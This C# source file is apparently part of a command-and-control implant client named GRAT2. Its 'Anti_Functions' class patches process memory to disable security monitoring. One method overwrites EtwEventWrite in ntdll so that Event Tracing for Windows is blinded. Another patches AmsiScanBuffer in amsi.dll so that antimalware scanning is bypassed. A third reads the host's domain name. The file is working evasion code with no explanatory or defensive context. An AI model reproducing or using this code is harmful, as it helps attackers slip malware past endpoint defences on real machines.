using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace GRAT2_Client.PInvoke
{
    class Anti_Functions
    {
        public static string Domain_Check()
        {
            string domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
            return domain;
        }

        public static void PatchingEtw()
        {
            byte[] patch;

            if (IntPtr.Size == 4)
            {
                patch = new byte[] { 0xc2, 0x14, 0x00 };
            }
            else
            {
                patch = new byte[] { 0xc3 };
            }

                try
            {
                var hProcess = Process.GetCurrentProcess().Handle;

                uint oldProtect;

                var ntdll = Interop.LoadLibrary("ntdll.dll");
                var etwEventSend = Interop.GetProcAddress(ntdll, "EtwEventWrite");


                Interop.VirtualProtectEx(hProcess, etwEventSend, patch.Length, 0x40, out oldProtect);
                WriteProcessMemory(hProcess, etwEventSend, patch, patch.Length, out IntPtr bytesWritten);
                Interop.VirtualProtectEx(hProcess, etwEventSend, patch.Length, oldProtect, out oldProtect);

            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

        }
        public static void PatchingAmsi()
        {
            // https://twitter.com/_xpn_/status/1170852932650262530
            byte[] patch;

            if (IntPtr.Size == 4)
            {
                patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
            }
            else
            {
                patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            }
            try
            {
                var hProcess = Process.GetCurrentProcess().Handle;
                uint oldProtect;
                var library_Amsi = Interop.LoadLibrary("amsi.dll");
                var AmsiAddr = Interop.GetProcAddress(library_Amsi, "AmsiScanBuffer");

                Interop.VirtualProtectEx(hProcess, AmsiAddr, patch.Length, 0x40, out oldProtect);
                WriteProcessMemory(hProcess, AmsiAddr, patch, patch.Length, out IntPtr bytesWritten);
                Interop.VirtualProtectEx(hProcess, AmsiAddr, patch.Length, oldProtect, out oldProtect);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

        }

        [DllImport("Kernel32.dll", SetLastError = true)]
        internal static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    }
}
